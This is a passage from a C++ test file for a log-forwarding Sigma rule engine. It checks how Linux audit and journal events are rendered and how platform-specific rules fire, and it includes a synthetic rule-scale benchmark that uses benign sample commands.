                {L"cwd", L"/home/cole"}, {L"Message", L"EXECVE argc=3 a0=\"head\" a1=\"-c\" a2=\"1500\""}}));
            CHECK(d["event"]["module"] == "auditd");
            CHECK(d["event"]["dataset"] == "auditd.log");
            CHECK(d["event"]["category"] == json::array({"process"}));
            CHECK(d["event"]["type"] == json::array({"start"}));
            CHECK(d["event"]["action"] == "executed");
            CHECK(d["event"]["outcome"] == "success");
            CHECK(d["event"]["code"] == "1309");
            CHECK(d["auditd"]["log"]["record_type"] == "EXECVE");
            CHECK(d["auditd"]["log"]["sequence"] == 2047);
            CHECK(d["auditd"]["log"]["key"] == "elf_exec");
            CHECK(d["process"]["pid"] == 927615);
            CHECK(d["process"]["parent"]["pid"] == 927598);
            CHECK(d["process"]["executable"] == "/usr/bin/head");
            CHECK(d["process"]["name"] == "head");
            CHECK(d["process"]["command_line"] == "head -c 1500");
            CHECK(d["process"]["args"] == json::array({"head", "-c", "1500"}));
            CHECK(d["process"]["working_directory"] == "/home/cole");
            CHECK(d["user"]["id"] == "1000");
        }
        // A Windows event has no TRANSPORT field and keeps the winlog shape.
        {
            json d = ecsOf(makeEvt(4624, L"Security", {{L"TargetUserName", L"alice"}}));
            CHECK(d["event"]["module"] == "windows");
            CHECK(d.contains("winlog") && !d.contains("journald"));
        }
        // The engine classifies the audit EXECVE as process_creation, so a
        // Linux category rule fires on it, and Image resolves to the exe.
        {
            namespace fs = std::filesystem;
            fs::create_directories("test_rules_lin");
            std::ofstream("test_rules_lin/lin_pc.yaml") <<
                "title: Linux process creation\nid: lin_pc_test\nstatus: test\nlevel: low\n"
                "logsource:\n  product: linux\n  category: process_creation\n"
                "detection:\n  selection:\n    Image|endswith: '/head'\n    CommandLine|contains: '-c'\n  condition: selection\n"
                "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
            auto rules = loadRulesFromDirectory("test_rules_lin");
            CHECK(rules.size() == 1);
            CHECK(sigmaCategoriesFor("audit", 1309) == std::vector<std::string>{"process_creation"});
            Config lc; lc.destinations["alerts"] = parseDestinationUrl("alerts", "file://lin_alerts.jsonl?format=json");
            EventBuffer buf; Forwarder fwd; fwd.setConfig(lc); RuleEngine eng(buf, fwd);
            setHostSigmaProductForTests("linux");
            eng.reload(rules);
            auto q = eng.deriveChannelQueries();
            // product: linux + process_creation -> the audit channel, record type 1309.
            bool auditFiltered = false;
            for (const auto& [ch, ids] : q) {
                if (ch == "audit") auditFiltered = (ids == std::vector<int>{1309});
            }
            CHECK(q.size() == 1 && auditFiltered);
            buf.push(journalEvt(L"audit", 1309, {{L"type", L"EXECVE"}, {L"NewProcessName", L"/usr/bin/head"},
                                                   {L"CommandLine", L"head -c 1500"}}).xml);
            buf.push(journalEvt(L"audit", 1300, {{L"type", L"SYSCALL"}, {L"NewProcessName", L"/usr/bin/head"},
                                                   {L"CommandLine", L"head -c 1500"}}).xml);
            // Only the EXECVE record is a process_creation event.
            CHECK(eng.evaluateOnce() == 1);
            // On a Windows host the same rule is not evaluated at all.
            setHostSigmaProductForTests("windows");
            eng.reload(rules);
            buf.push(journalEvt(L"audit", 1309, {{L"type", L"EXECVE"}, {L"NewProcessName", L"/usr/bin/head"},
                                                   {L"CommandLine", L"head -c 1500"}}).xml);
            CHECK(eng.evaluateOnce() == 0);
            CHECK(eng.deriveChannelQueries().empty());   // nothing to subscribe to
            fs::remove_all("test_rules_lin");
            fs::remove("lin_alerts.jsonl");
        }
        // A Windows rule is skipped on a Linux host and evaluated on Windows.
        {
            namespace fs = std::filesystem;
            fs::create_directories("test_rules_win_on_lin");
            std::ofstream("test_rules_win_on_lin/w.yaml") <<
                "title: Windows logon\nid: win_on_lin_test\nstatus: test\nlevel: low\n"
                "logsource:\n  product: windows\n  service: security\n"
                "detection:\n  selection:\n    EventID: 4624\n  condition: selection\n"
                "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
            auto rules = loadRulesFromDirectory("test_rules_win_on_lin");
            Config lc; lc.destinations["alerts"] = parseDestinationUrl("alerts", "file://win_on_lin.jsonl?format=json");
            EventBuffer buf; Forwarder fwd; fwd.setConfig(lc); RuleEngine eng(buf, fwd);
            setHostSigmaProductForTests("linux");
            eng.reload(rules);
            buf.push(makeEvt(4624, L"Security", {{L"TargetUserName", L"alice"}}).xml);
            CHECK(eng.evaluateOnce() == 0);
            setHostSigmaProductForTests("windows");
            eng.reload(rules);
            buf.push(makeEvt(4624, L"Security", {{L"TargetUserName", L"alice"}}).xml);
            // With no rule indexed the pass above left its cursor in place,
            // so both logons are evaluated now.
            CHECK(eng.evaluateOnce() >= 1);
            fs::remove_all("test_rules_win_on_lin");
            fs::remove("win_on_lin.jsonl");
        }

#ifndef _WIN32
        // --- Renderer: a syslog entry ---
        {
            JournalEntry e;
            e.fields = {{"MESSAGE", "Accepted publickey for cole from 10.35.69.7 port 5555 ssh2"},
                        {"SYSLOG_IDENTIFIER", "sshd-session"}, {"PRIORITY", "6"}, {"_PID", "4242"},
                        {"_UID", "0"}, {"_COMM", "sshd-session"}, {"_EXE", "/usr/sbin/sshd"},
                        {"_HOSTNAME", "dev21564"}, {"_TRANSPORT", "syslog"}, {"__CURSOR", "s=1;i=2"},
                        {"_SYSTEMD_UNIT", "ssh.service"}, {"_CMDLINE", "\"sshd: cole [priv]\""}};
            e.realtimeUsec = 1792489611866898ULL;
            CHECK(journalChannel(e) == "sshd-session");
            CHECK(journalEventId(e) == 0);
            BufferedEvent be; be.xml = journalEntryToXml(e, {});
            CHECK(!be.xml.empty());
            CHECK(extractEventIdCached(be) == 0);
            CHECK(extractRecordIdCached(be) == 1792489611866898LL);
            CHECK(wideToUtf8(extractChannelCached(be)) == "sshd-session");
            CHECK(wideToUtf8(resolveFieldCached(be, "Computer")) == "dev21564");
            CHECK(wideToUtf8(resolveFieldCached(be, "Provider")) == "sshd-session");
            CHECK(wideToUtf8(resolveFieldCached(be, "TimeCreated")) == "2026-10-20T09:46:51.866898Z");
            CHECK(wideToUtf8(resolveFieldCached(be, "Message")).rfind("Accepted publickey", 0) == 0);
            CHECK(wideToUtf8(resolveFieldCached(be, "pid")) == "4242");
            CHECK(wideToUtf8(resolveFieldCached(be, "exe")) == "/usr/sbin/sshd");
            CHECK(wideToUtf8(resolveFieldCached(be, "SYSTEMD_UNIT")) == "ssh.service");
            CHECK(wideToUtf8(resolveFieldCached(be, "ProcessId")) == "4242");
            CHECK(wideToUtf8(resolveFieldCached(be, "NewProcessName")) == "/usr/sbin/sshd");
            CHECK(wideToUtf8(resolveFieldCached(be, "CommandLine")) == "\"sshd: cole [priv]\"");
            CHECK(resolveFieldCached(be, "CURSOR").empty());    // storage keys are not data
            CHECK(resolveFieldCached(be, "HOSTNAME").empty());  // rendered as Computer
            CHECK(eventDedupKey(be) != 0);
        }
        // --- Renderer: an audit event joined from its records ---
        {
            auto rec = [](const char* type, const char* typeName, const char* id,
                          std::vector<std::pair<std::string, std::string>> extra) {
                JournalEntry e;
                e.fields = {{"_TRANSPORT", "audit"}, {"_AUDIT_ID", id}, {"_AUDIT_TYPE", type},
                            {"_AUDIT_TYPE_NAME", typeName}, {"SYSLOG_IDENTIFIER", "audit"},
                            {"_HOSTNAME", "dev21564"}};
                for (auto& kv : extra) e.fields.push_back(kv);
                return e;
            };
            std::vector<std::pair<std::wstring, std::vector<std::string>>> emitted;   // channel, (type, CommandLine, a0, exe)
            AuditJoiner joiner([&](const JournalEntry& e, const std::vector<const JournalEntry*>& sib) {
                BufferedEvent be; be.xml = journalEntryToXml(e, sib);
                emitted.push_back({extractChannelCached(be), {
                    wideToUtf8(resolveFieldCached(be, "type")),
                    wideToUtf8(resolveFieldCached(be, "CommandLine")),
                    wideToUtf8(resolveFieldCached(be, "a0")),
                    wideToUtf8(resolveFieldCached(be, "exe")),
                    wideToUtf8(resolveFieldCached(be, "key")),
                    wideToUtf8(resolveFieldCached(be, "cwd")),
                    wideToUtf8(resolveFieldCached(be, "name")),
                    std::to_string(extractEventIdCached(be))}});
            });
            // A syslog line in between must not split the group.
            JournalEntry syslog;
            syslog.fields = {{"MESSAGE", "hello"}, {"SYSLOG_IDENTIFIER", "cron"}, {"_TRANSPORT", "syslog"}};
            joiner.push(rec("1300", "SYSCALL", "2047", {{"_AUDIT_FIELD_SYSCALL", "59"}, {"_AUDIT_FIELD_SUCCESS", "yes"},
                                                         {"_AUDIT_FIELD_A0", "5a26878d82f0"}, {"_AUDIT_FIELD_A3", "21"},
                                                         {"_PID", "927615"}, {"_PPID", "927598"}, {"_UID", "1000"},
                                                         {"_EXE", "/usr/bin/head"}, {"_COMM", "head"},
                                                         {"_AUDIT_FIELD_KEY", "\"elf_exec\""}}));
            joiner.push(syslog);
            joiner.push(rec("1309", "EXECVE", "2047", {{"_AUDIT_FIELD_ARGC", "3"}, {"_AUDIT_FIELD_A0", "\"head\""},
                                                        {"_AUDIT_FIELD_A1", "\"-c\""},
                                                        {"_AUDIT_FIELD_A2", "68656C6C6F20776F726C64"}}));   // hex "hello world"
            joiner.push(rec("1307", "CWD", "2047", {{"_AUDIT_FIELD_CWD", "\"/home/cole\""}}));
            joiner.push(rec("1302", "PATH", "2047", {{"_AUDIT_FIELD_NAME", "\"/usr/bin/head\""}, {"_AUDIT_FIELD_ITEM", "0"}}));
            joiner.push(rec("1327", "PROCTITLE", "2047", {{"_CMDLINE", "head -c hello world"}}));
            CHECK(emitted.size() == 1);   // only the syslog line so far
            joiner.push(rec("1320", "EOE", "2047", {}));
            CHECK(emitted.size() == 6);   // 5 records, EOE consumed
            if (emitted.size() == 6) {
                CHECK(emitted[0].first == L"cron");
                // SYSCALL: argv from the EXECVE sibling, own a0 stays a pointer.
                CHECK(emitted[1].second[0] == "SYSCALL");
                CHECK(emitted[1].second[1] == "head -c hello world");
                CHECK(emitted[1].second[2] == "5a26878d82f0");
                CHECK(emitted[1].second[4] == "elf_exec");    // quotes stripped
                CHECK(emitted[1].second[5] == "/home/cole");  // merged from CWD
                CHECK(emitted[1].second[7] == "1300");
                // EXECVE: decoded argv, exe/key merged from SYSCALL, name from PATH.
                CHECK(emitted[2].second[0] == "EXECVE");
                CHECK(emitted[2].second[1] == "head -c hello world");
                CHECK(emitted[2].second[2] == "head");
                CHECK(emitted[2].second[3] == "/usr/bin/head");
                CHECK(emitted[2].second[4] == "elf_exec");
                CHECK(emitted[2].second[6] == "/usr/bin/head");
                CHECK(emitted[2].second[7] == "1309");
                CHECK(emitted[3].second[0] == "CWD");
                CHECK(emitted[4].second[0] == "PATH");
                CHECK(emitted[5].second[0] == "PROCTITLE");
            }
            // A new audit id flushes the previous group without an EOE.
            joiner.push(rec("1300", "SYSCALL", "2048", {}));
            joiner.push(rec("1300", "SYSCALL", "2049", {}));
            CHECK(emitted.size() == 7);
            joiner.flushAll();
            CHECK(emitted.size() == 8);
            // Idle flush.
            joiner.push(rec("1300", "SYSCALL", "2050", {}));
            joiner.flushIfIdle(std::chrono::milliseconds(0));
            CHECK(emitted.size() == 9);
            // An audit record without an id passes straight through.
            JournalEntry noId;
            noId.fields = {{"_TRANSPORT", "audit"}, {"_AUDIT_TYPE", "1130"}, {"_AUDIT_TYPE_NAME", "SERVICE_START"}};
            joiner.push(noId);
            CHECK(emitted.size() == 10);
        }
        // --- Renderer: values that are not XML-safe ---
        {
            JournalEntry e;
            e.fields = {{"MESSAGE", "a<b & c>d \"quoted\" \x01" "ctl"}, {"SYSLOG_IDENTIFIER", "x&y"}, {"_TRANSPORT", "syslog"}};
            BufferedEvent be; be.xml = journalEntryToXml(e, {});
            CHECK(wideToUtf8(resolveFieldCached(be, "Message")) == "a&lt;b &amp; c&gt;d \"quoted\"  ctl");
            CHECK(wideToUtf8(extractChannelCached(be)) == "x&amp;y");
        }
        // --- Time parsing ---
        {
            uint64_t usec = 0;
            CHECK(parseIsoUtcUsec("2026-10-20T09:46:51.866898Z", usec) && usec == 1792489611866898ULL);
            CHECK(parseIsoUtcUsec("2026-10-20T09:46:51Z", usec) && usec == 1792489611000000ULL);
            CHECK(parseIsoUtcUsec("2026-10-20T09:46:51.5Z", usec) && usec == 1792489611500000ULL);
            CHECK(!parseIsoUtcUsec("yesterday", usec));
        }
        // --- UTF-8 conversion rejects what is not a scalar value ---
        {
            CHECK(utf8ToWide("caf\xC3\xA9") == L"caf\u00E9");
            CHECK(wideToUtf8(L"caf\u00E9") == "caf\xC3\xA9");
            CHECK(utf8ToWide("\xED\xA0\x80") == L"\uFFFD");          // surrogate
            CHECK(utf8ToWide("\xC0\xAF") == L"\uFFFD\uFFFD");        // overlong lead + stray continuation
            CHECK(utf8ToWide("\xF4\x90\x80\x80") == L"\uFFFD");      // > U+10FFFF
            CHECK(utf8ToWide("\xE2\x82") == L"\uFFFD");              // truncated
            CHECK(wideToUtf8(std::wstring(1, static_cast<wchar_t>(0xD800))) == "\xEF\xBF\xBD");
        }
#endif  // !_WIN32
        std::filesystem::remove("lin_ecs.ndjson");
    }

    // ============================================================
    // SCALE (env-gated: set ELF_SCALE_TEST=1)
    // ------------------------------------------------------------
    // 3,000 synthetic SigmaHQ-shaped rules + one planted needle rule,
    // 2,000 mixed events. Prints µs/event; asserts the needle fires exactly
    // once and the average stays under 1 ms/event in Release.
    // ============================================================
    if (std::getenv("ELF_SCALE_TEST")) {
        namespace fs = std::filesystem;
        fs::remove_all("test_rules_scale");
        fs::create_directories("test_rules_scale");
        fs::path dir = "test_rules_scale";
        auto writeRule = [&](const std::string& id, const std::string& body) {
            std::ofstream(dir / (id + ".yaml")) <<
                "title: " << id << "\nid: " << id << "\nstatus: test\nlevel: medium\n" << body <<
                "elf:\n  actions:\n    - type: alert\n      destination: alerts\n";
        };
        for (int i = 0; i < 1000; ++i) {
            std::string re = (i % 10 == 0)
                ? "    CommandLine|re: '(scale_needle_" + std::to_string(i) + "|\\bnever\\b)'\n" : "";
            writeRule("sc_pc_" + std::to_string(i),
                "logsource:\n  product: windows\n  category: process_creation\n"
                "detection:\n  selection:\n    Image|endswith: '\\scale_" + std::to_string(i) + ".exe'\n"
                "    CommandLine|contains|all:\n      - 'scale_a_" + std::to_string(i) + "'\n      - 'scale_b'\n" + re +
                "  filter:\n    CommandLine|contains: 'scale_filter'\n"
                "  condition: selection and not filter\n");
            writeRule("sc_net_" + std::to_string(i),
                "logsource:\n  product: windows\n  category: network_connection\n"
                "detection:\n  selection:\n    DestinationPort: " + std::to_string(10000 + i) + "\n"
                "    Image|endswith: '\\scale_net_" + std::to_string(i) + ".exe'\n"
                "  condition: selection\n");
            writeRule("sc_sec_" + std::to_string(i),
                "logsource:\n  product: windows\n  service: security\n"
                "detection:\n  selection:\n    EventID:\n      - 4624\n      - 4625\n      - 4672\n"
                "    TargetUserName|startswith: 'scale_user_" + std::to_string(i) + "'\n"
                "  condition: selection\n");
        }
        writeRule("sc_needle",
            "logsource:\n  product: windows\n  category: process_creation\n"
            "detection:\n  selection:\n    CommandLine|contains: 'elf-needle-7731'\n"
            "  condition: selection\n");
        auto t0 = std::chrono::steady_clock::now();
        LoadSummary s = loadRules("test_rules_scale", "");
        auto t1 = std::chrono::steady_clock::now();
        CHECK(s.parsed == 3001 && s.failed == 0);
        { std::ofstream ofs("alerts.jsonl", std::ios::trunc); }
        EventBuffer buf; Forwarder fwd; fwd.setConfig(cfg); RuleEngine eng(buf, fwd);
        auto t2 = std::chrono::steady_clock::now();
        eng.reload(s.rules);
        auto t3 = std::chrono::steady_clock::now();
        const int N = 2000;
        for (int i = 0; i < N; ++i) {
            switch (i % 3) {
                case 0: buf.push(makeEvt(4688, L"Security",
                    {{L"NewProcessName", L"C:\\Windows\\System32\\cmd.exe"},
                     {L"CommandLine", i == 999 ? L"cmd /c elf-needle-7731" : L"cmd /c echo scale_b hello world"},
                     {L"ParentProcessName", L"C:\\Windows\\explorer.exe"}}).xml); break;
                case 1: buf.push(makeEvt(5156, L"Security",
                    {{L"Application", L"\\device\\harddiskvolume1\\windows\\system32\\svchost.exe"},
                     {L"DestAddress", L"10.0.0.5"}, {L"DestPort", L"443"}, {L"Protocol", L"6"}}).xml); break;
                default: buf.push(makeEvt(4624, L"Security",
                    {{L"TargetUserName", L"alice"}, {L"LogonType", L"3"}, {L"IpAddress", L"10.0.0.9"}}).xml); break;
            }
        }
        auto t4 = std::chrono::steady_clock::now();
        size_t fires = eng.evaluateOnce();
        auto t5 = std::chrono::steady_clock::now();
        double usPerEvent = std::chrono::duration<double, std::micro>(t5 - t4).count() / N;
        std::cout << "[scale] load " << std::chrono::duration_cast<std::chrono::milliseconds>(t1 - t0).count()
                  << " ms, reload " << std::chrono::duration_cast<std::chrono::milliseconds>(t3 - t2).count()
                  << " ms, eval " << N << " events in "
                  << std::chrono::duration_cast<std::chrono::milliseconds>(t5 - t4).count()
                  << " ms = " << usPerEvent << " us/event, fires=" << fires << "\n";
        CHECK(fires == 1);
        CHECK(countOccurrences("alerts.jsonl", "rule_id: sc_needle") == 1);
        // Budget: 1.5 ms/event with ~2,000 applicable rules per event in
        // Release (~1 ms typical on a Windows Server 2022 host; the margin
        // leaves headroom for a loaded CI box).
        CHECK(usPerEvent <= 1500.0);
        fs::remove_all("test_rules_scale");
    }

    // Final cleanup: close the global log streams (which still hold open
    // handles to files in test_loglevel/ and test_logrotate/) and then
    // remove those directories. We can't remove them earlier because
    // Windows won't delete a directory containing an open file handle.
    openLogFiles("nul", "nul", 0, 0);
    {
        namespace fs = std::filesystem;
        std::error_code ec;
        fs::remove_all("test_loglevel", ec);
        fs::remove_all("test_logrotate", ec);
    }

    std::cout << "\n" << g_pass << " passed, " << g_fail << " failed\n";
    return g_fail == 0 ? 0 : 1;
}
